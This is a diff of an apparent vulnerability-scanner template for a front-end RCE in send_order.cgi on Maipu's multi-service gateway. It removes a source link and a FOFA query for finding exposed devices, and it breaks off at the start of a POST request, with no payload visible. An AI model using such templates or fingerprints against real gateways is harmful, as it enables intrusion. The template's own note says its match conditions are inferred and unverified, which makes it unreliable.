@@ -3,14 +3,8 @@ info:
   name: 迈普 多业务融合网关 send_order.cgi 前台RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vvagh70yfe5i5f3s
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vvagh70yfe5i5f3s
-    fofa: title=="迈普多业务融合网关"
 http:
 - raw:
   - 'POST /send_order.cgi?parameter=operation HTTP/1.1
